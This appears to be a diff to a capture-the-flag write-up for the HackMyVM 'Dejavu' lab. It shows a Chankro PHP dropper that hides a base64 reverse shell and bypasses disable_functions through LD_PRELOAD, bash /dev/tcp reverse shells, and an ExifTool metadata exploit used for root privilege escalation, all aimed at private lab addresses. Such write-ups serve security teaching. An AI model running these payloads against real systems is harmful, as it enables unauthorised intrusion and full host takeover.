@@ -12,9 +12,18 @@
 
 <img src="https://hackmyvm.eu/img/vm/ez.png" alt="Dejavu Machine Logo" width="150"/>
 
+#### Tools Used
+
+- Chankro
+- Gobuster
+- LinPEAS
+- Netcat
+- Nmap
+- SearchSploit
+
 #### Machine Writeup
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ifconfig`:
 ```
@@ -433,21 +442,30 @@ This is just an echo PHTML test. ←
 | error_log                 | no value                                                                                                                                                                                                                                                                                      | no value                                                                                                                                                                                                                                                                            |
 
 <div>
-	<img src="assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
+	<img src="./assets/logo_github.png" alt="GitHub Logo" width="16" height="auto">
 	<span style="color: white; font-size: 110%;"><strong>GitHub</strong></span>
 </div>
 
 [Chankro](https://github.com/TarlogicSecurity/Chankro/tree/master)
 
-**#Chankro**. Your favourite tool to bypass **disable_functions** and **open_basedir** in your pentests.
+[**#Chankro**]
+
+Your favourite tool to bypass **disable_functions** and **open_basedir** in your pentests.
+
+PHP in Linux calls a binary (sendmail) when the mail() function is executed. If we have putenv() allowed, we can set the environment variable "LD_PRELOAD", so we can preload an arbitrary shared object. Our shared object will execute our custom payload (a binary or a bash script) without the PHP restrictions, so we can have a reverse shell, for example.
+The syntax is pretty straightforward:
+```
+$ python2 chankro.py --arch 64 --input rev.sh --output chan.php --path /var/www/html
+```
+Note: path is the absolute path where our .so will be dropped.
 
 `vim ./reverse_shell.sh`:
-```bash
+```sh
 #!/bin/bash
-bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
+bash -i >& /dev/tcp/192.168.56.101/4444 0>&1 2>&1
 ```
 
-`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html/`:
+`python2 chankro.py --arch 64 --input reverse_shell.sh --output reverse_shell.phtml --path /var/www/html`:
 ```
      -=[ Chankro ]=-
     -={ @TheXC3LL }=-
@@ -459,6 +477,27 @@ bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
 
 
 [+] File created! ←
+```
+
+`file ./reverse_shell.phtml`:
+```
+./reverse_shell.phtml: PHP script, ASCII text, with very long lines (11352) ←
+```
+
+`cat ./reverse_shell.phtml`:
+```php
+<?php
+ $hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQAAAA
+
+[...]
+
+AAAAAAAAAAAAAAAPsYAAAAAAAA9gAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=';
+$meterpreter = 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjExOC80NDQ0IDI+JjEgMD4mMQo=';
+file_put_contents('/var/www/html/chankro.so', base64_decode($hook));
+file_put_contents('/var/www/html/acpid.socket', base64_decode($meterpreter));
+putenv('CHANKRO=/var/www/html/acpid.socket');
+putenv('LD_PRELOAD=/var/www/html/chankro.so');
+mail('a','a','a','a');?>              
 ```
 
 `lynx http://192.168.56.112/S3cR3t/upload.php`:
@@ -484,7 +523,7 @@ bash: no job control in this shell
 <nMostCriticalInternetSecurityThreats/S3cR3t/files$ 
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>www-data</code> }</b></span>
+![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
 `python3 -c 'import pty; pty.spawn("/bin/bash")' && stty raw -echo && fg; export TERM=xterm; stty rows $(tput lines) cols $(tput cols)`
 
@@ -552,11 +591,11 @@ usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
 Listening on 0.0.0.0 5555 ←
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `cat /opt/linpeas.sh | nc 192.168.56.112 5555`
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>www-data</code> }</b></span>
+![Victim: www-data](https://img.shields.io/badge/Victim-www%2D-data-64b5f6?logo=linux&logoColor=white)
 
 ```
 Connection received on 192.168.56.101 40478 ←
@@ -670,7 +709,7 @@ listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
 13:13:01.333166 IP localhost.36704 > localhost.ftp: Flags [.], ack 93, win 512, options [nop,nop,TS val 3703854240 ecr 3703854240], length 0
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `ssh robert@192.168.56.112`:
 ```
@@ -704,7 +743,7 @@ To check for new updates run: sudo apt update
 Last login: Fri May 13 15:52:25 2022
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>
+![Victim: robert](https://img.shields.io/badge/Victim-robert-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
@@ -762,7 +801,7 @@ User robert may run the following commands on dejavu:
 12.23 ←
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `searchsploit exiftool`:
 ```              
@@ -813,7 +852,7 @@ robert@192.168.56.112's password: ←
 50911.py                               100% 4740     2.5MB/s   00:00 ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>
+![Victim: robert](https://img.shields.io/badge/Victim-robert-64b5f6?logo=linux&logoColor=white)
 
 `python3 ./50911.py -s 192.168.56.101 6666`:
 ```
@@ -822,25 +861,25 @@ PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('
 RUNTIME: DONE - Exploit image written to 'image.jpg' ←
 ```
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 `nc -lvnp 6666`:
 ```                                                                    
 listening on [any] 6666 ... ←
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>
+![Victim: robert](https://img.shields.io/badge/Victim-robert-64b5f6?logo=linux&logoColor=white)
 
 `sudo /usr/local/bin/exiftool image.jpg`
 
-<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>
+![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)
 
 ```
 connect to [192.168.56.101] from (UNKNOWN) [192.168.56.112] 58808 ←
 /bin/sh: 0: can't access tty; job control turned off
 ```
 
-<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>root</code> }</b></span>
+![Victim: www-root](https://img.shields.io/badge/Victim-root-64b5f6?logo=linux&logoColor=white)
 
 `whoami`:
 ```
